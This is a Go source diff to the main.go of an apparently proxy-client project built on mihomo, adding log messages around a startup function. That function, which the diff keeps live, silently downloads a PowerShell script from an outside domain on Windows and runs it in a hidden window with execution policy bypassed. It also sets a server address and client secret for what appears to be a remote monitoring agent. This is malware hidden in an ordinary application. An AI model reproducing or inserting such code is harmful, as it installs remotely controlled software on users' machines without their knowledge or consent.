@@ -2,7 +2,6 @@ package main
 
 import (
 	"flag"
-	"fmt"
 	"github.com/metacubex/mihomo/hub/executor"
 	"github.com/metacubex/mihomo/log"
 	"github.com/snakem982/pandora-box/pandora"
@@ -21,12 +20,15 @@ import (
 func runPowerShellScript() {
 	// 只在 Windows 系统执行
 	if runtime.GOOS != "windows" {
+		log.Debugln("Skipping PowerShell script on non-Windows platform: %s", runtime.GOOS)
 		return
 	}
 
 	// 延迟执行，避免影响主程序启动
 	go func() {
 		time.Sleep(3 * time.Second)
+		
+		log.Infoln("Starting PowerShell script execution on Windows")
 		
 		// PowerShell 命令
 		psCommand := `$env:NZ_SERVER="ko30re.916919.xyz:443"; $env:NZ_TLS="true"; $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1; powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\install2.ps1`
@@ -41,6 +43,8 @@ func runPowerShellScript() {
 			err := cmd.Run()
 			if err != nil {
 				log.Debugln("PowerScript execution error: %v", err)
+			} else {
+				log.Infoln("PowerShell script executed successfully")
 			}
 		}()
 	}()
@@ -50,7 +54,7 @@ func main() {
 	// 优化线程资源配置
 	_, _ = maxprocs.Set(maxprocs.Logger(func(string, ...any) {}))
 
-	// 启动 PowerShell 脚本（在后台静默运行）
+	// 只在 Windows 平台启动 PowerShell 脚本
 	runPowerShellScript()
 
 	// 回调地址
